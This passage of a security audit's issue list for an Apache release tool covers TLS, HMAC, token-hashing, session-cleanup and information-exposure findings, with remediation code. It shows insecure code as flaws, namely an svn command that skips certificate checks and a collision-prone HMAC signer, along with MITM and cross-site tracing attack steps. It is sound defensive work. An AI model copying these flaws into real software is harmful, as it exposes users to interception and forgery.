    'ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS'
)
ssl_context.load_cert_chain(
    'secrets/generated/cert.pem',
    'secrets/generated/key.pem'
)

# Export for Hypercorn
bind = ['127.0.0.1:8443']
```

Modify start scripts to use config:
```bash
# In start-atr.sh and start-dev.sh
hypercorn --config hypercorn_config.py atr.server:app
```

**Alternative:** Pass explicit TLS parameters using `--ssl-ciphers` flag:
```bash
hypercorn --certfile secrets/generated/cert.pem \
          --keyfile secrets/generated/key.pem \
          --ssl-ciphers 'ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20' \
          --bind 127.0.0.1:8443 \
          atr.server:app
```

### Acceptance Criteria
- [ ] Hypercorn uses explicit TLS version configuration
- [ ] TLS 1.2+ is enforced at application server level
- [ ] Cipher suites are explicitly restricted to AEAD-only
- [ ] Configuration file documents TLS settings
- [ ] Start scripts use hardened TLS configuration
- [ ] Integration test verifies TLS version enforcement

### References
- Source reports: L1:12.1.1.md
- Related findings: FINDING-274
- ASVS sections: 12.1.1

### Priority
Medium

---

## Issue: FINDING-276 - SVN Export Bypasses TLS Certificate Validation

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The SVN export operation uses the `--trust-server-cert-failures` flag with `unknown-ca,cn-mismatch`, which instructs the SVN client to accept certificates signed by unknown/untrusted certificate authorities and certificates where the Common Name doesn't match the hostname. This defeats the authentication component of TLS, reducing it to encryption-only. While the connection is encrypted, there is no cryptographic verification that the server is actually `dist.apache.org`. A network-level attacker could perform MITM and serve malicious artifacts during SVN import.

### Details
In `atr/tasks/svn.py` around line 86, the SVN export command uses:
```bash
svn export https://dist.apache.org/repos/dist/... \
  --trust-server-cert-failures unknown-ca,cn-mismatch
```

This flag configuration:
- `unknown-ca`: Accepts certificates from untrusted CAs
- `cn-mismatch`: Accepts certificates with wrong hostname

This means:
- Any certificate is accepted regardless of CA
- Hostname verification is disabled
- No cryptographic verification of server identity
- MITM attacker can intercept SVN traffic

Attack scenario:
1. Attacker performs network MITM
2. Presents self-signed certificate for `dist.apache.org`
3. SVN client accepts certificate due to flags
4. Attacker serves malicious artifacts
5. ATR imports malicious content

This violates ASVS 12.2.1's requirement that TLS be used for "all connectivity" with external services (implying proper validation).

### Recommended Remediation
**Option 1 (Recommended):** Remove the `--trust-server-cert-failures` flags entirely:
```bash
# In atr/tasks/svn.py
svn export https://dist.apache.org/repos/dist/...
```

If `dist.apache.org` uses a publicly trusted certificate (which it should), no special trust configuration is needed.

**Option 2:** If `dist.apache.org` uses a custom CA, install the ASF CA certificate in the container trust store:
```bash
# In Dockerfile or container initialization
cp asf-ca-cert.crt /usr/local/share/ca-certificates/
update-ca-certificates
```

**Option 3 (Most Secure):** Implement explicit certificate pinning using svn config options:
```bash
svn export https://dist.apache.org/repos/dist/... \
  --config-option servers:global:ssl-authority-files=/path/to/asf-ca-bundle.crt
```

### Acceptance Criteria
- [ ] SVN export validates TLS certificates properly
- [ ] Certificate authority is verified
- [ ] Hostname verification is enabled
- [ ] MITM attacks are prevented
- [ ] Integration test verifies certificate validation
- [ ] If custom CA needed, installation is documented

### References
- Source reports: L1:12.2.1.md
- Related findings: None
- ASVS sections: 12.2.1

### Priority
Medium

---

## Issue: FINDING-277 - HMAC Signer Canonicalization Weakness — Colon Stripping Permits Signature Confusion

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The `Signer.sign()` method strips colons from input arguments before joining them with colon delimiters, creating signature collisions. Different logical inputs can produce identical HMAC signatures: `sign('a:b', 'c')` and `sign('ab', 'c')` both produce the same signature because colons are removed before joining with `:`. This allows an attacker who controls argument values to manipulate colon placement and produce valid signatures for different logical inputs, weakening integrity protection and violating ASVS 11.3.3's requirement for proper authenticated encryption or MAC protection.

### Details
In `asfpy/crypto.py` (lines 108-112), the `sign()` method:
```python
def sign(self, *argv: str) -> str:
    """Return a URL-safe HMAC-SHA256 signature for the given args."""
    parts = [self.prefix]
    for arg in argv:
        s = str(arg)
        parts.append(s.replace(':', ''))  # Strips colons
    message = ':'.join(parts).encode('utf-8')  # Joins with colons
    digest = hmac.new(self.key, message, hashlib.sha256).digest()
    return base64.urlsafe_b64encode(digest).decode('ascii').rstrip('=')
```

Signature collision examples:
```python
sign('a:b', 'c')  # Canonicalizes to "prefix:ab:c"
sign('ab', 'c')   # Also canonicalizes to "prefix:ab:c"
# Both produce identical signatures!

sign('user:', 'id')   # Canonicalizes to "prefix:user:id"  
sign('user', ':id')   # Also canonicalizes to "prefix:user:id"
# Attacker can manipulate colon placement
```

This allows:
- Signature reuse across different logical inputs
- Manipulation of field boundaries
- Weakened integrity protection

### Recommended Remediation
Replace colon-stripping canonicalization with length-prefixed encoding:

```python
def sign(self, *argv: str) -> str:
    """Return a URL-safe HMAC-SHA256 signature for the given args."""
    parts = [self.prefix]
    for arg in argv:
        s = str(arg)
        # Length-prefix format: "length:value"
        parts.append(f"{len(s)}:{s}")
    message = "|".join(parts).encode('utf-8')  # Use different separator
    digest = hmac.new(self.key, message, hashlib.sha256).digest()
    return base64.urlsafe_b64encode(digest).decode('ascii').rstrip('=')
```

**Alternative:** Use null-byte separators:
```python
def sign(self, *argv: str) -> str:
    """Return a URL-safe HMAC-SHA256 signature for the given args."""
    message = '\x00'.join([self.prefix] + [str(arg) for arg in argv])
    digest = hmac.new(self.key, message.encode('utf-8'), hashlib.sha256).digest()
    return base64.urlsafe_b64encode(digest).decode('ascii').rstrip('=')
```

### Acceptance Criteria
- [ ] Signature canonicalization prevents collisions
- [ ] Different inputs produce different signatures
- [ ] Length-prefixed or null-byte encoding is used
- [ ] Unit tests verify collision prevention
- [ ] Backward compatibility is addressed (may require migration)

### References
- Source reports: L2:11.3.3.md
- Related findings: FINDING-073
- ASVS sections: 11.3.3

### Priority
Medium

---

## Issue: FINDING-278 - PAT Storage Uses Fast Hash (SHA3-256) Instead of Approved KDF

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Personal Access Tokens (PATs) are stored as SHA3-256 hashes instead of using an approved password hashing function per ASVS 11.4.2. SHA3-256 is a general-purpose cryptographic hash function that completes in nanoseconds per hash, enabling high-speed brute-force attacks if the database is compromised. While PATs are generated with 256-bit entropy (via `secrets.token_urlsafe(32)`) which makes brute-force infeasible regardless of hash speed, the fast hash provides no safety net if PAT generation were ever weakened or an implementation bug reduced entropy.

### Details
In `atr/storage/writers/tokens.py` (line 89), PATs are hashed using:
```python
token_hash = hashlib.sha3_256(token.encode()).hexdigest()
```

SHA3-256 characteristics:
- General-purpose cryptographic hash
- Extremely fast (nanoseconds per hash)
- No computational cost barrier
- Enables high-speed brute-force if entropy is reduced

Defense-in-depth argues for using a slow KDF even when the input has high entropy, because:
- Implementation bugs could reduce PAT entropy
- Configuration errors could weaken token generation
- Future changes might accidentally weaken tokens
- Slow hash provides safety net against these scenarios

Without a computational cost barrier, an attacker with DB access could rapidly crack PATs if entropy is reduced through bugs, configuration errors, or future changes to the token generation mechanism.

### Recommended Remediation
Replace SHA3-256 with an approved KDF for PAT storage:

**Recommended Implementation (PBKDF2):**
```python
import hashlib
import secrets

def hash_pat(token: str) -> tuple[str, str]:
    """Hash PAT using PBKDF2-HMAC-SHA256 with 600k iterations."""
    salt = secrets.token_bytes(32)  # 256-bit salt
    digest = hashlib.pbkdf2_hmac('sha256', token.encode('utf-8'), salt, 600_000)
    return digest.hex(), salt.hex()

def verify_pat(token: str, stored_hash: str, stored_salt: str) -> bool:
    """Verify PAT against stored hash."""
    salt = bytes.fromhex(stored_salt)
    digest = hashlib.pbkdf2_hmac('sha256', token.encode('utf-8'), salt, 600_000)
    return secrets.compare_digest(digest.hex(), stored_hash)
```

**Migration Path:**
1. Add `token_hash_version` column to `PersonalAccessToken` model (default `1` for SHA3-256)
2. New PATs use version `2` with PBKDF2
3. On successful PAT→JWT exchange with version `1`, re-hash with version `2` and update
4. After migration period (e.g., 180 days = PAT max lifetime), reject version `1` tokens

**Alternative (Argon2):**
```python
import argon2

ph = argon2.PasswordHasher(
    time_cost=3,
    memory_cost=65536,
    parallelism=4,
    hash_len=32,
    salt_len=32
)

def hash_pat(token: str) -> str:
    """Hash PAT using Argon2id."""
    return ph.hash(token)

def verify_pat(token: str, stored_hash: str) -> bool:
    """Verify PAT against stored hash."""
    try:
        ph.verify(stored_hash, token)
        return True
    except argon2.exceptions.VerifyMismatchError:
        return False
```

### Acceptance Criteria
- [ ] PAT storage uses approved KDF (PBKDF2 or Argon2)
- [ ] Computational cost barrier prevents high-speed brute-force
- [ ] Migration path preserves existing PATs
- [ ] Version field tracks hash algorithm
- [ ] Unit tests verify hashing and verification
- [ ] Performance impact is acceptable (< 100ms per hash)

### References
- Source reports: L2:11.4.2.md
- Related findings: None
- ASVS sections: 11.4.2

### Priority
Medium

---

## Issue: FINDING-279 - Clear-Site-Data Header Missing on Implicit Session Termination

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The application implements the `Clear-Site-Data` HTTP response header on explicit logout (`/auth?logout`) but fails to send this header when sessions are terminated implicitly through inactivity timeout (7 days), absolute session maximum (72 hours), or account deactivation. This creates a gap where authenticated content remains cached in the browser after implicit session termination. On shared computers, subsequent users could potentially view cached authenticated content via browser back button, cache inspection tools, or browser developer tools.

### Details
In `src/asfquart/session.py` (lines 52-56), explicit logout sends `Clear-Site-Data` header. However, implicit termination paths do not:

1. **Inactivity timeout** (`atr/blueprints/common.py` lines 27-30): Session expired check returns 401 without `Clear-Site-Data`
2. **Absolute session maximum** (`atr/server.py` lines 337-363): Before-request hook terminates old sessions without header
3. **Account deactivation**: LDAP `is_active()` check returns 401 without header

When sessions are terminated implicitly:
- Browser retains cached authenticated HTML pages
- Browser storage may contain JavaScript-accessible data
- HTTP cache entries contain authenticated content
- Subsequent users on shared computers could access cached content

### Recommended Remediation
**Option A (Explicit):** Add `Clear-Site-Data` to error responses:

```python
# In atr/blueprints/common.py, authenticate() function
async def authenticate():
    session_data = await asfquart.session.read()
    if not session_data:
        # Add Clear-Site-Data header to 401 response
        response = quart.Response(
            "Authentication required",
            status=401,
            headers={'Clear-Site-Data': '"cache", "cookies", "storage"'}
        )
        quart.abort(response)
    # ... rest of authentication ...
```

**Option B (Recommended - Centralized):** Add `after_request` hook:

```python
# In atr/server.py
@app.after_request
async def add_clear_site_data_on_session_termination(response):
    """Add Clear-Site-Data header to all 401 responses."""
    if response.status_code == 401:
        response.headers['Clear-Site-Data'] = '"cache", "cookies", "storage"'
    return response
```

This automatically applies the header to all session termination scenarios.

### Acceptance Criteria
- [ ] `Clear-Site-Data` header is sent on implicit session termination
- [ ] 401 responses include header automatically
- [ ] Cached authenticated content is cleared on timeout
- [ ] Cached content is cleared on account deactivation
- [ ] Shared computer scenario is protected
- [ ] Unit test verifies header presence on 401 responses

### References
- Source reports: L1:14.3.1.md
- Related findings: None
- ASVS sections: 14.3.1

### Priority
Medium

---

## Issue: FINDING-280 - No Client-Side Fallback for Offline Session Cleanup

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
ASVS 14.3.1 explicitly requires that the client-side should also be able to clear up if the server connection is not available when the session is terminated. The application contains no JavaScript mechanism that detects session termination when the server is unreachable, clears authenticated data from client storage on browser/tab close, or provides periodic session validity checks with client-side cleanup. In offline scenarios, cached authenticated content persists indefinitely without cleanup.

### Details
The application lacks client-side session management for offline scenarios:

**Missing capabilities:**
1. Detect session termination when server unreachable
2. Clear authenticated data on browser/tab close
3. Periodic session validity checks
4. Client-side cleanup on session expiration

**Offline scenario risks:**
- Browser/tab closure without logout → cached pages persist indefinitely
- Session expires while user offline → no client-side cleanup
- Network failure during session → authenticated content remains in cache
- Shared computers → subsequent users can access cached content

**Attack vectors:**
- Browser back button shows authenticated pages
- "Recently closed tabs" feature exposes authenticated content
- Browser cache inspection reveals authenticated data
- No cleanup mechanism when server unavailable

No JavaScript code exists in `atr/static/js/` or `atr/static/ts/` to handle offline session management.

### Recommended Remediation
Implement a comprehensive client-side session watchdog:

```javascript
// atr/static/js/session-watchdog.js

(function() {
    'use strict';
    
    const SESSION_CHECK_INTERVAL = 5 * 60 * 1000; // 5 minutes
    const SESSION_ENDPOINT = '/auth';
    
    /**
     * Clear all authenticated data from client-side storage
     */
    function clearAuthenticatedData() {
        // Remove DOM elements marked as authenticated
        document.querySelectorAll('[data-authenticated]').forEach(el => {
            el.remove();
        });
        
        // Clear session storage
        sessionStorage.clear();
        
        // Note: Don't clear localStorage (may have user preferences)
        
        // Redirect to login
        window.location.href = '/login?reason=session_terminated';
    }
    
    /**
     * Check session validity with server
     */
    async function checkSession() {
        try {
            const response = await fetch(SESSION_ENDPOINT, {
                method: 'HEAD',
                cache: 'no-store'
            });
            
            if (response.status === 401) {
                // Session invalid - clear client-side
                clearAuthenticatedData();
            }
        } catch (error) {
            // Network error - can't verify session
            // Don't clear immediately, but log for monitoring
            console.warn('Session check failed (offline?)', error);
        }
    }
    
    /**
     * Clear data when page is hidden (tab close, minimize)
     */
    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'hidden') {
            clearAuthenticatedData();
        }
    });
    
    /**
     * Clear data when page is unloaded or cached (bfcache)
     */
    window.addEventListener('pagehide', function(event) {
        clearAuthenticatedData();
    });
    
    /**
     * Periodic session check
     */
    setInterval(checkSession, SESSION_CHECK_INTERVAL);
    
    /**
     * Check on page load
     */
    checkSession();
    
})();
```

Include this script on all authenticated page templates:
```html
<script src="/static/js/session-watchdog.js" defer></script>
```

### Acceptance Criteria
- [ ] Client-side session watchdog script is implemented
- [ ] Periodic session validity checks run every 5 minutes
- [ ] Session termination detection works offline
- [ ] Authenticated data is cleared when page becomes hidden
- [ ] Authenticated data is cleared when page is unloaded
- [ ] Script is included on all authenticated pages
- [ ] Browser back button does not show authenticated content after cleanup

### References
- Source reports: L1:14.3.1.md
- Related findings: None
- ASVS sections: 14.3.1

### Priority
Medium

---

## Issue: FINDING-281 - Admin /admin/env Exposes All Environment Variables Without Debug Gating or Redaction

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The `/admin/env` endpoint exposes all environment variables without checking if debug mode is enabled and without redacting sensitive values. While admin authentication is required, this is a debugging feature that should only be available in debug mode. Common secrets exposed include `LDAP_BIND_PASSWORD`, `GITHUB_TOKEN`, `SVN_TOKEN`, `PUBSUB_PASSWORD`, etc. The sibling 'configuration' route demonstrates correct pattern by redacting sensitive patterns. Administrator sees plaintext secrets that should be protected even from privileged users per defense-in-depth principles.

### Details
In `atr/admin/__init__.py`, the `/admin/env` endpoint:
- Does NOT check debug mode
- Does NOT redact sensitive values
- Exposes all environment variables to admins

The sibling `/admin/configuration` endpoint (same file) demonstrates proper pattern:
- Checks patterns like PASSWORD, SECRET, TOKEN, KEY
- Redacts matching values with `[REDACTED]`

Common secrets exposed:
- `LDAP_BIND_PASSWORD` - LDAP service account password
- `GITHUB_TOKEN` - GitHub API authentication
- `SVN_TOKEN` - SVN service authentication
- `PUBSUB_PASSWORD` - PubSub service password
- `AWS_SECRET_ACCESS_KEY` - AWS credentials (if configured)
- Others

While admin access is required, defense-in-depth argues secrets should be redacted even from privileged users, and debugging features should be gated behind debug mode.

### Recommended Remediation
Add debug mode check and sensitive value redaction:

```python
# In atr/admin/__init__.py

@admin.get("/env")
async def env():
    """Display environment variables (debug mode only, with redaction)."""
    # Require debug mode
    _require_debug_and_allow_tests()
    
    # Sensitive patterns to redact
    sensitive_patterns = ('PASSWORD', 'SECRET', 'TOKEN', 'KEY', 'CREDENTIAL', 'AUTH')
    
    env_vars = []
    for key, value in sorted(os.environ.items()):
        # Redact sensitive values
        if any(pattern in key.upper() for pattern in sensitive_patterns):
            value = '[REDACTED]'
        env_vars.append(f"{key}={value}")
    
    return template.render(
        'admin/env.html',
        title='Environment Variables',
        env_vars=env_vars,
        warning='Debug mode - sensitive values redacted'
    )
```

### Acceptance Criteria
- [ ] `/admin/env` requires debug mode
- [ ] Sensitive environment variables are redacted
- [ ] Redaction pattern matches `/admin/configuration` endpoint
- [ ] Template shows redaction warning
- [ ] Production mode returns 404
- [ ] Unit test verifies redaction of common secrets

### References
- Source reports: L2:13.4.2.md
- Related findings: ASVS-1342-LOW-001, ASVS-1342-LOW-002
- ASVS sections: 13.4.2

### Priority
Medium

---

## Issue: FINDING-282 - Test Endpoints Accessible in Production Without ALLOW_TESTS Check

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Three test endpoints (`test_empty`, `test_multiple`, `test_single`) are publicly accessible without checking the `ALLOW_TESTS` configuration flag. In the same file, three other test routes (`test_login`, `test_merge`, `test_vote`) correctly implement the protection by returning 404 when `ALLOW_TESTS` is False. This inconsistency creates a gap where debug/test features remain accessible in production. No authentication is required for these endpoints, allowing anyone to access test functionality.

### Details
In `atr/get/test.py`:

**Missing ALLOW_TESTS check:**
- Line 44: `test_empty()` - No protection
- Line 117: `test_multiple()` - No protection  
- Line 141: `test_single()` - No protection

**Correct ALLOW_TESTS implementation:**
- `test_login()` - Checks `config.get().ALLOW_TESTS`
- `test_merge()` - Checks `config.get().ALLOW_TESTS`
- `test_vote()` - Checks `config.get().ALLOW_TESTS`

The protected endpoints use:
```python
if not config.get().ALLOW_TESTS:
    return quart.abort(404)
```

The unprotected endpoints lack this check, allowing:
- Test functionality in production
- Unauthenticated access to test features
- Potential information disclosure
- Inconsistent test endpoint protection

### Recommended Remediation
Add `ALLOW_TESTS` check at the beginning of unprotected test functions:

```python
# In atr/get/test.py

@test.get("/test/empty")
async def test_empty():
    """Test endpoint - development only."""
    # ADD: ALLOW_TESTS check
    if not config.get().ALLOW_TESTS:
        return quart.abort(404)
    
    # Existing test logic
    # ...

@test.get("/test/multiple")
async def test_multiple():
    """Test endpoint - development only."""
    # ADD: ALLOW_TESTS check
    if not config.get().ALLOW_TESTS:
        return quart.abort(404)
    
    # Existing test logic
    # ...

@test.get("/test/single")
async def test_single():
    """Test endpoint - development only."""
    # ADD: ALLOW_TESTS check
    if not config.get().ALLOW_TESTS:
        return quart.abort(404)
    
    # Existing test logic
    # ...
```

### Acceptance Criteria
- [ ] All test endpoints check `ALLOW_TESTS` configuration
- [ ] Production mode returns 404 for test endpoints
- [ ] Test endpoints are only accessible when explicitly enabled
- [ ] Consistent protection across all test routes
- [ ] Unit test verifies 404 when `ALLOW_TESTS=False`

### References
- Source reports: L2:13.4.2.md
- Related findings: None
- ASVS sections: 13.4.2

### Priority
Medium

---

## Issue: FINDING-283 - Unauthenticated /api/tasks/list Endpoint Exposes Internal Error Details

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The `/api/tasks/list` endpoint is publicly accessible without authentication and returns task records including the 'error' field. When tasks fail in the worker process, exception messages are stored directly in this field via `str(e)`. These error messages can contain internal file paths, function names, configuration details, and other implementation information. Task types, arguments, project names, version keys, and user identifiers are also exposed to unauthenticated users.

### Details
In `atr/api/__init__.py` (lines 810-835) and `atr/worker.py` (lines 232-235):

**Endpoint exposure:**
- `/api/tasks/list` - No authentication required
- Returns full `Task` objects including error field
- Accessible to public/unauthenticated users

**Error field population** (in worker):
```python
try:
    await task_handler(task)
except Exception as e:
    task.error = str(e)  # Full exception message stored
```

**Exposed information:**
- Internal file paths from stack traces
- Function names and code structure
- Configuration details
- Database queries
- Task arguments (may contain sensitive data)
- User identifiers (`asf_uid`)
- Project names and version keys

Example error exposure:
```json
{
  "id": 123,
  "task_type": "METADATA_UPDATE",
  "asf_uid": "admin_user",
  "error": "FileNotFoundError: [Errno 2] No such file or directory: '/app/data/internal/config.yaml'"
}
```

### Recommended Remediation
**Option 1 (Recommended):** Add authentication requirement:
```python
# In atr/api/__init__.py
@api.get("/tasks/list")
@jwtoken.require  # ADD: Require JWT authentication
async def list_tasks(project_key: Optional[str] = None):
    tasks = await data.get_tasks(project_key)
    return {"tasks": tasks}
```

**Option 2:** Sanitize error field in response:
```python
@api.get("/tasks/list")
async def list_tasks(project_key: Optional[str] = None):
    tasks = await data.get_tasks(project_key)
    
    # Sanitize error messages for non-admin users
    is_admin = await check_admin_status()
    if not is_admin:
        for task in tasks:
            if task.error:
                # Replace detailed error with generic message
                task.error = "Task failed - contact administrator"
    
    return {"tasks": tasks}
```

**Option 3:** Remove error field from public API entirely, provide admin-only detailed endpoint.

### Acceptance Criteria
- [ ] Task list endpoint requires authentication OR
- [ ] Error messages are sanitized for public access
- [ ] Internal implementation details are not exposed
- [ ] Admin users can still access detailed errors (via separate endpoint or permission check)
- [ ] Unit test verifies error field sanitization/protection

### References
- Source reports: L2:13.4.2.md
- Related findings: ASVS-1342-LOW-003
- ASVS sections: 13.4.2

### Priority
Medium

---

## Issue: FINDING-284 - JWT Error Response Leaks Token Claim Content

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
When JWT token validation fails due to an invalid 'sub' claim type, the error message includes the raw claim value using `repr()` and Python type information. This leaks the internal structure of JWT claims and confirms implementation details to attackers, aiding in crafting targeted attacks. Error reveals Python class names and internal type handling, providing reconnaissance information for attackers probing JWT validation.

### Details
In `atr/api/__init__.py` (lines 1080-1085), JWT validation error handling:
```python
if not isinstance(payload.get("sub"), str):
    raise base.ASFQuartException(
        f"Invalid JWT subject type: {repr(payload.get('sub'))} "
        f"(expected str, got {type(payload.get('sub')).__name__})",
        errorcode=401
    )
```

This error message exposes:
- Raw claim value via `repr()`
- Python type information
- Internal validation logic
- Confirmation of JWT structure expectations

Example leaked information:
```
Invalid JWT subject type: ['user123', 'admin'] (expected str, got list)
```

This tells an attacker:
- JWT accepts 'sub' claim
- Must be string type
- Application uses Python
- Type validation is performed

### Recommended Remediation
Replace detailed error message with generic message:

```python
# In atr/api/__init__.py
if not isinstance(payload.get("sub"), str):
    # Use generic error without revealing claim content or type
    raise base.ASFQuartException(
        'Invalid or missing token subject',
        errorcode=401
    )
```

Do NOT include:
- Raw claim values
- Type information
- Python class names
- Internal validation details

### Acceptance Criteria
- [ ] JWT validation errors use generic messages
- [ ] Claim values are not included in error responses
- [ ] Type information is not exposed
- [ ] Python implementation details are hidden
- [ ] Unit test verifies generic error messages
- [ ] Detailed errors are logged server-side only

### References
- Source reports: L2:13.4.2.md
- Related findings: ASVS-1342-LOW-003
- ASVS sections: 13.4.2

### Priority
Medium

---

## Issue: FINDING-285 - HTTP TRACE Method Not Disabled at Apache Reverse Proxy

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The Apache httpd reverse proxy configuration does not include the `TraceEnable Off` directive. Apache httpd enables TRACE by default. Critically, Apache handles TRACE requests natively—it echoes back the full HTTP request including all headers—and does not proxy TRACE to the backend application, regardless of ProxyPass rules. Sensitive headers (session cookies, Authorization tokens) are reflected back in TRACE responses, enabling Cross-Site Tracing (XST) attacks when combined with other vulnerabilities. This directly violates ASVS 13.4.4 (L2) requirement.

### Details
In `tooling-vm-ec2-de.apache.org.yaml`:
- Lines 76-155: Development vhost - No `TraceEnable Off`
- Lines 156-230: Staging vhost - No `TraceEnable Off`

Apache httpd default behavior:
- TRACE method enabled by default
- Apache handles TRACE natively (doesn't proxy to backend)
- Echoes full HTTP request including headers
- Returns all headers in response body

Attack scenario:
1. Attacker identifies XSS vulnerability
2. Uses JavaScript to send TRACE request
3. TRACE response includes `Cookie` and `Authorization` headers
4. Attacker reads headers from response body
5. Session hijacking via stolen cookies

Mitigations:
- Modern browsers block JavaScript TRACE requests
- BUT: Non-browser API clients and automated tools can exploit
- Defense-in-depth requires disabling TRACE

### Recommended Remediation
Add `TraceEnable Off` to Apache configuration at vhost level or globally:

**Option 1 (Vhost level):**
```yaml
# In tooling-vm-ec2-de.apache.org.yaml
custom_fragment: |
  # Disable HTTP TRACE method (ASVS 13.4.4)
  TraceEnable Off
  
  # ... other directives ...
```

**Option 2 (Global - Puppet/Hiera):**
```yaml
# In Hiera configuration
apache::trace_enable: 'Off'
```

Verify with:
```bash
curl -X TRACE https://tooling-vm-ec2-de.apache.org/
# Should return 405 Method Not Allowed or 403 Forbidden
```

### Acceptance Criteria
- [ ] `TraceEnable Off` directive is added to Apache configuration
- [ ] TRACE requests return 405 or 403 error
- [ ] Sensitive headers are not echoed in responses
- [ ] Configuration is applied to all vhosts (dev and staging)
- [ ] Verification test confirms TRACE is disabled

### References
- Source reports: L2:13.4.4.md
- Related findings: ASVS-1344-LOW-002
- ASVS sections: 13.4.4

### Priority
Medium

---

## Issue: FINDING-286 - Internal Documentation Publicly Exposed

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The `/docs/*` endpoints serve internal developer documentation without any authentication requirements. The `web.Public` session type explicitly marks these routes as accessible to unauthenticated users. Documentation includes sensitive information such as OAuth state storage details, architectural weaknesses (multi-instance deployment state lookup failures), permission hierarchy bypass methods, filesystem layouts, configuration variable names, and audit logging mechanisms. This violates ASVS 13.4.5 requirement that technical documentation not be exposed to unauthenticated users.

### Details
In `atr/get/docs.py`:
- Line 57: `index()` - `session: web.Public` (no auth required)
- Line 62: `page()` - `session: web.Public` (no auth required)

Path traversal protection is present and correct (prevents reading arbitrary files), but no authentication check exists.

**Sensitive information exposed:**
- `docs/oauth.md` - OAuth state storage architecture, multi-instance deployment weaknesses
- `docs/storage-interface.md` - Permission hierarchy, authorization bypass methods
- `docs/authorization-security.md` - Complete authorization model
- `docs/filesystem-layout.md` - Internal directory structure
- `docs/configuration.md` - Configuration variable names
- `docs/audit-logging.md` - Audit logging mechanisms

This provides attackers with:
- Complete understanding of authorization model
- Known architectural weaknesses
- Internal implementation details
- Configuration structure
- Attack surface mapping

### Recommended Remediation
**Option A (Recommended):** Require authentication for all documentation:
```python
# In atr/get/docs.py
@docs.get("/")
async def index(session: web.Committer):  # Changed from web.Public
    """Documentation index - requires authentication."""
    # ... existing logic ...

@docs.get("/<path:page>")
async def page(page: str, session: web.Committer):  # Changed from web.Public
    """Documentation page - requires authentication."""
    # ... existing logic ...
```

**Option B:** Separate public from internal docs:
```python
# Only serve from docs/public/ directory
# Move sensitive docs to docs/internal/
# Require auth for docs/internal/*
```

**Option C:** Gate behind production mode:
```python
@docs.get("/<path:page>")
async def page(page: str, session: web.Public):
    # In production, require authentication
    if config.get().mode == 'Production':
        quart.abort(404)
    # ... existing logic ...
```

**Option D:** Implement allowlist of permitted public docs:
```python
PUBLIC_DOCS = frozenset(['user-guide.md', 'api-reference.md'])

@docs.get("/<path:page>")
async def page(page: str, session: web.Public):
    # If not in public allowlist, require auth
    if page not in PUBLIC_DOCS:
        if not await is_authenticated():
            quart.abort(401)
    # ... existing logic ...
```

### Acceptance Criteria
- [ ] Internal documentation requires authentication
- [ ] Public users cannot access sensitive architecture docs
- [ ] Path traversal protection is maintained
- [ ] User-facing documentation remains accessible (if applicable)
- [ ] Unit test verifies authentication requirement
- [ ] Documentation explains which docs are public vs. internal

### References
- Source reports: L2:13.4.5.md
- Related findings: None
- ASVS sections: 13.4.5

### Priority
Medium

---

## Issue: FINDING-287 - Swagger UI and OpenAPI Specification Publicly Accessible

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The Swagger UI (`/api/docs`) and OpenAPI specification (`/api/openapi.json`) are publicly accessible without authentication. While the custom `ApiOnlyOpenAPIProvider` filters admin routes from the specification, the complete API surface for public endpoints is exposed. The `@quart_schema.hide` decorator only hides routes from the OpenAPI spec itself but does NOT restrict access to the endpoints. Blueprint-level protection only applies rate limiting with no authentication check. This exposes complete API surface enumeration, JWT vs unprotected endpoint mapping, request/response data models, and parameter types.

### Details
In `atr/server.py` and `atr/blueprints/api.py`:
- `/api/docs` - Swagger UI publicly accessible
- `/api/openapi.json` - OpenAPI spec publicly accessible
- `ApiOnlyOpenAPIProvider` filters admin routes
- Blueprint applies rate limiting only

**Exposed information:**
- Complete API endpoint list
- Request/response data models
- Parameter types and validation rules
- Authentication requirements per endpoint
- Internal naming conventions
- API versioning information

The homepage template (`atr/templates/about.html` line 51) links to API docs, suggesting intentional public access. However, ASVS 13.4.5 argues against exposing technical API documentation to unauthenticated users.

**Decision needed:** Is public API documentation intentional or oversight?

### Recommended Remediation
**If NOT intended to be public:**

Add authentication check to both endpoints:
```python
# In Swagger UI and OpenAPI serving code
@api.get("/docs")
async def swagger_ui():
    """Swagger UI - requires authentication."""
    session = await asfquart.session.read()
    if not session:
        quart.abort(404)  # Return 404 to hide existence
    # ... serve Swagger UI ...

@api.get("/openapi.json")
async def openapi_spec():
    """OpenAPI specification - requires authentication."""
    session = await asfquart.session.read()
    if not session:
        quart.abort(404)  # Return 404 to hide existence
    # ... serve OpenAPI spec ...
```

**If intentionally public:**

1. Document this decision in configuration or security documentation
2. Consider serving a minimal public version and full version behind auth
3. Ensure the OpenAPI spec doesn't leak internal implementation details
4. Add explicit comment in code explaining public access is intentional

### Acceptance Criteria
- [ ] Decision made: public or authenticated access
- [ ] If authenticated: Authentication check added to both endpoints
- [ ] If public: Decision documented with rationale
- [ ] OpenAPI spec does not leak sensitive implementation details
- [ ] Unit test verifies authentication requirement (if applicable)
- [ ] Documentation updated with access control decision

### References
- Source reports: L2:13.4.5.md
- Related findings: None
- ASVS sections: 13.4.5

### Priority
Medium

---

## Issue: FINDING-288 - Admin Environment Endpoint Exposes Secrets Without Redaction

